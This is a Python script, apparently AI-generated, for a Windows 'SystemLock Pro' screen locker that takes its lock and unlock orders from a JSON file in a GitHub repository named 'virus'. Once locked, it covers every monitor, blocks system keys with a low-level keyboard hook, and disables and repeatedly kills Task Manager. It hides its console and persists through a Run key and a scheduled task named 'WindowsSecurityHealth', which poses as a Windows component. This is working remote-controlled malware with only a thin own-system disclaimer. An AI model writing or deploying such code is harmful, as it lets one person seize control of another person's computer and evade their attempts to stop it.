#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SystemLock Pro v4.0 - Windows 11 Professional Edition
Single-file remote user lock
Control URL: https://raw.githubusercontent.com/developingmohammad-bit/virus/main/on.json

Features:
- Remote GitHub JSON polling with cache-buster + debounce
- Multi-monitor fullscreen overlay, always-on-top
- Low-level keyboard hook (Win, Alt+Tab, Alt+F4, Ctrl+Esc, etc.)
- Task Manager disable (process kill + registry policy)
- Watchdog + auto-rebuild
- Mutex single-instance
- DPI aware
- Emergency unlock: Ctrl+Shift+Q → Mohammad1405
- Safe test mode: --test (auto unlock 20s, F12 exit)
- Install/uninstall: --install / --uninstall
- Logging: %TEMP%/systemlock_pro.log

Author: Arena.ai – 2026-07-03
Use only on your own system. Legal responsibility is yours.
"""

import tkinter as tk
import tkinter.simpledialog as sd
import threading
import time
import urllib.request
import json
import ctypes
from ctypes import wintypes
import os
import sys
import logging
from logging.handlers import RotatingFileHandler
import subprocess
import random

# ==================== CONFIG ====================
VERSION = "4.0"
REMOTE_URL = "https://raw.githubusercontent.com/developingmohammad-bit/virus/main/on.json"
POLL_INTERVAL = 2.5
DEBOUNCE_REQUIRED = 2
TOGGLE_COOLDOWN = 2.5
CACHE_BUSTER = True
EMERGENCY_PASSWORD = "Mohammad1405"
APP_NAME = "WindowsSecurityHealth"
MUTEX_NAME = "Global\\SystemLockPro_Mohammad_2026"
LOG_FILE = os.path.join(os.getenv("TEMP", os.path.expanduser("~")), "systemlock_pro.log")

# test mode defaults
TEST_MODE = "--test" in sys.argv
AUTO_UNLOCK_TEST = 20  # seconds in test mode
# =================================================

# ---------- DPI Awareness (Windows 11 crisp fullscreen) ----------
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(2)  # Per monitor V2
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass

# ---------- Single Instance Mutex ----------
kernel32 = ctypes.windll.kernel32
mutex_handle = kernel32.CreateMutexW(None, False, MUTEX_NAME)
_last_err = kernel32.GetLastError()
if _last_err == 183:  # ERROR_ALREADY_EXISTS
    # Already running – exit silently
    sys.exit(0)

# ---------- Logging ----------
logger = logging.getLogger("SystemLockPro")
logger.setLevel(logging.INFO)
if not logger.handlers:
    try:
        fh = RotatingFileHandler(LOG_FILE, maxBytes=512*1024, backupCount=2, encoding="utf-8")
        fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logger.addHandler(fh)
    except Exception:
        pass
    ch = logging.StreamHandler()
    ch.setFormatter(logging.Formatter("[%(asctime)s] %(message)s", "%H:%M:%S"))
    logger.addHandler(ch)

def log_info(m): logger.info(m)
def log_warn(m): logger.warning(m)
def log_err(m): logger.error(m)

# ---------- Global state (thread-safe) ----------
state_lock = threading.Lock()
applied_locked = False
remote_state_last = None
consecutive_count = 0
last_toggle_time = 0.0
last_success_remote = False
shutdown_flag = False

user32 = ctypes.windll.user32

# ---------- Keyboard Hook ----------
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

keyboard_hook_handle = None
hook_proc_keepalive = None
hook_enabled = False

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]

# VK codes
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_CONTROL = 0x11
VK_MENU = 0x12  # Alt
VK_SHIFT = 0x10
VK_DELETE = 0x2E
VK_Q = 0x51

def is_key_down(vk):
    return (user32.GetAsyncKeyState(vk) & 0x8000) != 0

def ll_keyboard_proc(nCode, wParam, lParam):
    if nCode == 0 and hook_enabled:
        with state_lock:
            locked = applied_locked
        if locked and not TEST_MODE:  # در تست اجازه می‌دهیم کلیدها عبور کنند
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk = kb.vkCode
            alt = is_key_down(VK_MENU)
            ctrl = is_key_down(VK_CONTROL)
            shift = is_key_down(VK_SHIFT)

            # اجازه emergency: Ctrl+Shift+Q
            if ctrl and shift and vk == VK_Q:
                return user32.CallNextHookEx(keyboard_hook_handle, nCode, wParam, lParam)

            # Block list
            if vk in (VK_LWIN, VK_RWIN):
                return 1
            if alt and vk in (VK_TAB, VK_F4, VK_ESCAPE):
                return 1
            if ctrl and vk == VK_ESCAPE:
                return 1
            # Ctrl+Shift+Esc
            if ctrl and shift and vk == VK_ESCAPE:
                return 1
            # Alt+Esc, F4, Esc alone
            if vk in (VK_F4, VK_ESCAPE):
                return 1
            # Win+... combinations already caught by Win key
            # Apps key (menu)
            if vk == 0x5D:
                return 1
    return user32.CallNextHookEx(keyboard_hook_handle, nCode, wParam, lParam)

def install_keyboard_hook():
    global keyboard_hook_handle, hook_proc_keepalive, hook_enabled
    if keyboard_hook_handle:
        return True
    try:
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        hook_proc_keepalive = CMPFUNC(ll_keyboard_proc)
        keyboard_hook_handle = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc_keepalive,
            kernel32.GetModuleHandleW(None),
            0
        )
        hook_enabled = bool(keyboard_hook_handle)
        if hook_enabled:
            log_info(f"Keyboard hook OK: {keyboard_hook_handle}")
        else:
            log_warn("Keyboard hook failed – continuing without hook")
        return hook_enabled
    except Exception as e:
        log_err(f"Hook install exception: {e}")
        return False

def uninstall_keyboard_hook():
    global keyboard_hook_handle, hook_enabled
    hook_enabled = False
    if keyboard_hook_handle:
        try:
            user32.UnhookWindowsHookEx(keyboard_hook_handle)
        except Exception:
            pass
        keyboard_hook_handle = None
        log_info("Keyboard hook removed")

# ---------- Remote fetch (clean, robust) ----------
def parse_remote_payload(text: str):
    """Return True / False / None if unknown"""
    t = text.strip()
    low = t.lower()

    # try JSON
    if low.startswith("{"):
        try:
            j = json.loads(t)
            if isinstance(j, bool):
                return j
            if isinstance(j, dict):
                for k in ("on", "enabled", "active", "lock", "block", "status", "state"):
                    if k in j:
                        v = j[k]
                        if isinstance(v, bool):
                            return v
                        if isinstance(v, (int, float)):
                            return bool(v)
                        if isinstance(v, str):
                            vl = v.lower()
                            if vl in ("true", "1", "on", "yes", "enable", "enabled", "lock", "locked"):
                                return True
                            if vl in ("false", "0", "off", "no", "disable", "disabled", "unlock", "unlocked"):
                                return False
        except Exception:
            pass

    # direct keywords – exact match first
    if low in ("true", "1", "on", "yes", "enable", "enabled", "lock", "locked"):
        return True
    if low in ("false", "0", "off", "no", "disable", "disabled", "unlock", "unlocked"):
        return False

    # substring fallback – false has priority
    has_false = "false" in low or "off" in low or "disable" in low or "unlock" in low
    has_true = "true" in low or "\"on\"" in low or ": true" in low

    if has_false and not has_true:
        return False
    if has_true and not has_false:
        return True
    if has_false and has_true:
        # last occurrence wins
        lf = max(low.rfind("false"), low.rfind("off"), low.rfind("disable"))
        lt = max(low.rfind("true"), low.rfind("\"on\""))
        return lf > lt if lf >= 0 and lt >= 0 else has_true

    return None  # unknown

def fetch_remote_state():
    global last_success_remote
    try:
        url = REMOTE_URL
        if CACHE_BUSTER:
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}v={int(time.time())}_{random.randint(1000,9999)}"
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": f"SystemLockPro/{VERSION}",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "Accept": "application/json, text/plain, */*"
            }
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            raw = resp.read().decode("utf-8", errors="ignore").strip()
            if not raw:
                return last_success_remote
            parsed = parse_remote_payload(raw)
            if parsed is None:
                log_warn(f"Unrecognized payload: {raw[:100]!r}")
                return last_success_remote
            last_success_remote = parsed
            return parsed
    except Exception as e:
        log_warn(f"Fetch failed: {e} – keep last={last_success_remote}")
        return last_success_remote

# ---------- Task Manager policy ----------
def set_taskmgr_disabled(disabled: bool):
    """Enable/disable Task Manager via registry – reversible"""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            if disabled:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            else:
                try:
                    winreg.DeleteValue(key, "DisableTaskMgr")
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
            return True
        except Exception as e:
            log_warn(f"TaskMgr policy error: {e}")
            return False
    except Exception:
        return False

def kill_taskmgr_process():
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", "Taskmgr.exe", "/T"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000),
            timeout=1.5
        )
    except Exception:
        pass

# ---------- Overlay ----------
class OverlayManager:
    def __init__(self, root):
        self.root = root
        self.windows = []
        self.active = False
        self._lock = threading.Lock()

    def get_monitors(self):
        mons = []
        def enum_proc(hMon, hdc, lprcMonitor, dwData):
            r = lprcMonitor.contents
            mons.append((r.left, r.top, r.right - r.left, r.bottom - r.top))
            return 1
        try:
            MONITORENUMPROC = ctypes.WINFUNCTYPE(
                ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
                ctypes.POINTER(wintypes.RECT), ctypes.c_double
            )
            user32.EnumDisplayMonitors(0, 0, MONITORENUMPROC(enum_proc), 0)
        except Exception:
            pass
        if not mons:
            mons = [(0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1))]
        return mons

    def create(self):
        with self._lock:
            if self.active:
                return
            self.active = True
        mons = self.get_monitors()
        log_info(f"Overlay create on {len(mons)} monitor(s)")
        created = []
        try:
            for idx, (x, y, w, h) in enumerate(mons):
                win = tk.Toplevel(self.root)
                win.overrideredirect(True)
                win.attributes("-topmost", True)
                # Windows 11 fullscreen robust
                try:
                    win.attributes("-fullscreen", True)
                except Exception:
                    pass
                win.geometry(f"{w}x{h}+{x}+{y}")
                win.configure(bg="#0a0f1c")
                win.protocol("WM_DELETE_WINDOW", lambda: None)
                # block keys at Tk level too
                for seq in ("<Alt-F4>", "<Escape>", "<Control-Escape>", "<Control-Alt-Delete>"):
                    win.bind(seq, lambda e: "break")
                win.bind("<Control-Shift-q>", lambda e: self._ask_password())
                win.bind("<Control-Shift-Q>", lambda e: self._ask_password())
                if TEST_MODE:
                    win.bind("<F12>", lambda e: self._emergency_exit())

                # --- UI ---
                f = tk.Frame(win, bg="#0a0f1c")
                f.place(relx=0.5, rely=0.5, anchor="center")

                tk.Label(f, text="⛔  SYSTEM LOCKED", fg="#ff3b3b", bg="#0a0f1c",
                         font=("Segoe UI", 30, "bold")).pack(pady=(0, 10))
                tk.Label(f, text="دسترسی کاربر مسدود شده است", fg="#ffffff", bg="#0a0f1c",
                         font=("Segoe UI", 16)).pack()
                tk.Label(f, text=f"SystemLock Pro v{VERSION}  •  Remote policy active",
                         fg="#7f8fa4", bg="#0a0f1c", font=("Consolas", 11)).pack(pady=(6, 18))

                status_lbl = tk.Label(f, text="STATUS: LOCKED", fg="#00e676", bg="#0a0f1c",
                                      font=("Consolas", 12, "bold"))
                status_lbl.pack()
                info_lbl = tk.Label(f, text="", fg="#5a6475", bg="#0a0f1c", font=("Consolas", 10))
                info_lbl.pack(pady=(8, 0))

                if TEST_MODE:
                    test_lbl = tk.Label(f, text=f"TEST MODE – Auto unlock in {AUTO_UNLOCK_TEST}s – F12 to exit",
                                        fg="#ffaa00", bg="#0a0f1c", font=("Consolas", 11, "bold"))
                    test_lbl.pack(pady=(12, 0))
                    win._test_lbl = test_lbl

                tk.Label(f, text="Emergency unlock: Ctrl+Shift+Q",
                         fg="#2a3342", bg="#0a0f1c", font=("Consolas", 9)).pack(pady=(24, 0))

                win._status_lbl = status_lbl
                win._info_lbl = info_lbl
                win._blink = False
                win._start_time = time.time()

                # animation / enforce
                def make_loop(w=win):
                    def loop():
                        if not w.winfo_exists():
                            return
                        try:
                            w._blink = not w._blink
                            w._status_lbl.config(fg="#00e676" if w._blink else "#ff3b3b")
                            elapsed = int(time.time() - w._start_time)
                            w._info_lbl.config(
                                text=f"{time.strftime('%Y-%m-%d %H:%M:%S')}  •  up {elapsed}s  •  {REMOTE_URL.split('/')[-2]}/{REMOTE_URL.split('/')[-1]}"
                            )
                            # enforce topmost + focus
                            w.attributes("-topmost", True)
                            w.lift()
                            # mouse confine to center (soft)
                            if elapsed % 3 == 0:
                                try:
                                    ww = w.winfo_width()
                                    wh = w.winfo_height()
                                    if ww > 50:
                                        user32.SetCursorPos(x + ww // 2, y + wh // 2)
                                except Exception:
                                    pass
                        except Exception:
                            pass
                        if w.winfo_exists():
                            w.after(550, loop)
                    return loop

                win.after(150, make_loop())

                # grab input on primary monitor
                if idx == 0:
                    try:
                        win.focus_force()
                        win.grab_set_global()
                    except Exception:
                        try:
                            win.grab_set()
                        except Exception:
                            pass

                created.append(win)

            self.windows = created
            # enable protections
            set_taskmgr_disabled(True)
            install_keyboard_hook()
            log_info("Lock overlay ACTIVE")

        except Exception as e:
            log_err(f"Overlay create failed: {e}")
            # cleanup partial
            for w in created:
                try: w.destroy()
                except: pass
            with self._lock:
                self.active = False
            self.windows = []
            raise

    def destroy(self):
        with self._lock:
            if not self.active and not self.windows:
                return
            self.active = False
        log_info("Overlay destroying")
        # remove protections first
        uninstall_keyboard_hook()
        set_taskmgr_disabled(False)
        for w in list(self.windows):
            try:
                try: w.grab_release()
                except Exception: pass
                w.destroy()
            except Exception:
                pass
        self.windows.clear()
        log_info("Overlay destroyed")

    def _ask_password(self):
        if not self.windows:
            return
        parent = self.windows[0]
        try:
            # ensure dialog is on top
            parent.attributes("-topmost", False)
            parent.update()
            parent.attributes("-topmost", True)
            ans = sd.askstring("Emergency Unlock", "Enter password:", show="*", parent=parent)
            if ans == EMERGENCY_PASSWORD:
                log_info("Emergency password accepted")
                self._emergency_exit()
            else:
                if ans is not None:
                    # wrong password – flash
                    try:
                        parent.configure(bg="#3a0000")
                        parent.after(200, lambda: parent.configure(bg="#0a0f1c"))
                    except: pass
        except Exception as e:
            log_err(f"Password dialog error: {e}")
        finally:
            try:
                parent.focus_force()
            except: pass

    def _emergency_exit(self):
        # force unlock and exit – hardened
        global shutdown_flag, last_success_remote, remote_state_last, consecutive_count
        with state_lock:
            shutdown_flag = True
            last_success_remote = False
            remote_state_last = False
            consecutive_count = DEBOUNCE_REQUIRED + 10
        request_state_change(False, force=True)
        # kill protections immediately
        try:
            uninstall_keyboard_hook()
            set_taskmgr_disabled(False)
        except Exception:
            pass
        # exit now – no delay risk
        def do_exit():
            try:
                if overlay_manager:
                    overlay_manager.destroy()
            except Exception:
                pass
            os._exit(0)
        if self.windows:
            try:
                self.windows[0].after(150, do_exit)
            except Exception:
                do_exit()
        else:
            do_exit()

# ---------- State machine ----------
overlay_manager = None
root_app = None

def request_state_change(want_locked: bool, force=False):
    global applied_locked, last_toggle_time
    now = time.time()
    with state_lock:
        if not force and now - last_toggle_time < TOGGLE_COOLDOWN:
            return False
        if want_locked == applied_locked and not force:
            return False
        last_toggle_time = now
        applied_locked = want_locked
    # apply outside lock to avoid deadlock with UI
    if want_locked:
        log_info(">>> LOCK ON")
        if overlay_manager:
            try:
                overlay_manager.create()
            except Exception as e:
                log_err(f"create overlay failed: {e}")
                with state_lock:
                    applied_locked = False
                return False
    else:
        log_info(">>> LOCK OFF")
        if overlay_manager:
            overlay_manager.destroy()
    return True

# ---------- Threads ----------
def poller_thread():
    global remote_state_last, consecutive_count, shutdown_flag
    log_info("Poller started")
    while not shutdown_flag:
        # local kill switch
        kill_file = os.path.expanduser("~/.systemlock_kill")
        if os.path.exists(kill_file):
            log_info("Kill switch file found – exiting")
            if root_app:
                root_app.after(0, lambda: request_state_change(False, force=True))
                root_app.after(600, lambda: os._exit(0))
            break

        remote = fetch_remote_state()
        with state_lock:
            if remote == remote_state_last:
                consecutive_count += 1
            else:
                remote_state_last = remote
                consecutive_count = 1
            cc = consecutive_count
            appl = applied_locked

        if cc >= DEBOUNCE_REQUIRED and remote != appl:
            log_info(f"Remote stable={remote} ({cc}x) – toggling from {appl}")
            if root_app:
                root_app.after(0, lambda r=remote: request_state_change(r))

        # test mode auto unlock
        if TEST_MODE and appl:
            # check elapsed via overlay start time
            try:
                if overlay_manager and overlay_manager.windows:
                    st = overlay_manager.windows[0]._start_time
                    if time.time() - st > AUTO_UNLOCK_TEST:
                        log_info("Test auto-unlock timeout")
                        if root_app:
                            root_app.after(0, lambda: request_state_change(False, force=True))
            except Exception:
                pass

        time.sleep(POLL_INTERVAL)

def taskmgr_killer_thread():
    while not shutdown_flag:
        with state_lock:
            locked = applied_locked
        if locked and not TEST_MODE:
            kill_taskmgr_process()
            time.sleep(0.8)
        else:
            time.sleep(1.8)

def watchdog_thread():
    while not shutdown_flag:
        time.sleep(2.2)
        with state_lock:
            locked = applied_locked
        if not overlay_manager:
            continue
        try:
            has_windows = bool(overlay_manager.windows)
            all_exist = all(w.winfo_exists() for w in overlay_manager.windows) if has_windows else False
            if locked and (not has_windows or not all_exist):
                log_warn("Watchdog: overlay missing while locked – rebuilding")
                if root_app:
                    root_app.after(0, lambda: (overlay_manager.destroy(), overlay_manager.create()))
            elif not locked and has_windows:
                log_warn("Watchdog: stray overlay while unlocked – cleaning")
                if root_app:
                    root_app.after(0, overlay_manager.destroy)
        except Exception as e:
            log_warn(f"Watchdog error: {e}")

# ---------- Autostart ----------
def install_autostart(silent=False):
    try:
        import winreg
        exe = sys.executable
        script = os.path.abspath(__file__)
        if exe.lower().endswith(("python.exe", "pythonw.exe")):
            pw = exe.replace("python.exe", "pythonw.exe")
            cmd = f'"{pw}" "{script}" --silent'
        else:
            # compiled exe
            cmd = f'"{exe}" --silent'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        # also Task Scheduler (best effort)
        try:
            task_cmd = f'schtasks /create /tn "{APP_NAME}" /tr "{cmd}" /sc ONLOGON /rl HIGHEST /f'
            subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
        except Exception:
            pass
        log_info(f"Autostart installed: {cmd}")
        if not silent:
            print(f"[+] Autostart installed\n    {cmd}")
        return True
    except Exception as e:
        log_err(f"Autostart failed: {e}")
        if not silent:
            print(f"[-] Install failed: {e}")
        return False

def uninstall_autostart():
    ok = True
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        print("[+] Registry Run removed")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"[-] Registry: {e}")
        ok = False
    # task scheduler
    try:
        subprocess.run(f'schtasks /delete /tn "{APP_NAME}" /f',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        print("[+] Scheduled task removed")
    except Exception:
        pass
    # cleanup policy
    set_taskmgr_disabled(False)
    # kill switch
    try:
        with open(os.path.expanduser("~/.systemlock_kill"), "w") as f:
            f.write("1")
    except Exception:
        pass
    return ok

# ---------- Main ----------
def main():
    global root_app, overlay_manager, shutdown_flag

    # CLI
    if "--install" in sys.argv:
        install_autostart(silent="--silent" in sys.argv)
        return
    if "--uninstall" in sys.argv:
        uninstall_autostart()
        # kill running instances
        try:
            subprocess.run(["taskkill", "/F", "/IM", "SystemLockPro.exe", "/T"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe", "/FI", f"WINDOWTITLE eq *{APP_NAME}*"],
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        except Exception:
            pass
        print("Uninstall complete.")
        return
    if "--status" in sys.argv:
        print(f"SystemLock Pro v{VERSION}")
        print(f"Remote: {REMOTE_URL}")
        print(f"Log: {LOG_FILE}")
        print(f"Locked: {applied_locked}")
        return

    # hide console unless --console
    if "--console" not in sys.argv and "--test" not in sys.argv:
        try:
            user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    log_info("="*60)
    log_info(f"SystemLock Pro v{VERSION} starting – TEST_MODE={TEST_MODE}")
    log_info(f"Remote: {REMOTE_URL}")
    log_info(f"PID: {os.getpid()}")

    root_app = tk.Tk()
    root_app.withdraw()
    # make root topmost invisible helper
    try:
        root_app.attributes("-topmost", True)
    except Exception:
        pass

    global overlay_manager
    overlay_manager = OverlayManager(root_app)

    # start background threads
    threading.Thread(target=poller_thread, daemon=True, name="poller").start()
    threading.Thread(target=taskmgr_killer_thread, daemon=True, name="killer").start()
    threading.Thread(target=watchdog_thread, daemon=True, name="watchdog").start()

    # keyboard hook message pump (needed for LL hook)
    def pump():
        msg = wintypes.MSG()
        while user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1):
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        if not shutdown_flag:
            root_app.after(10, pump)
    pump()

    # test mode: auto lock after 2 sec for quick demo
    if TEST_MODE:
        log_info(f"TEST MODE – auto lock in 2s, auto unlock after {AUTO_UNLOCK_TEST}s, F12 to exit")
        root_app.after(2000, lambda: request_state_change(True, force=True))

    log_info("Main loop started – waiting for remote state")
    try:
        root_app.mainloop()
    except KeyboardInterrupt:
        log_info("KeyboardInterrupt")
    finally:
        shutdown_flag = True
        try:
            uninstall_keyboard_hook()
            set_taskmgr_disabled(False)
            if overlay_manager:
                overlay_manager.destroy()
        except Exception:
            pass
        log_info("Shutdown complete")
        # release mutex
        try:
            kernel32.ReleaseMutex(mutex_handle)
            kernel32.CloseHandle(mutex_hook := mutex_handle)
        except Exception:
            pass

if __name__ == "__main__":
    main()
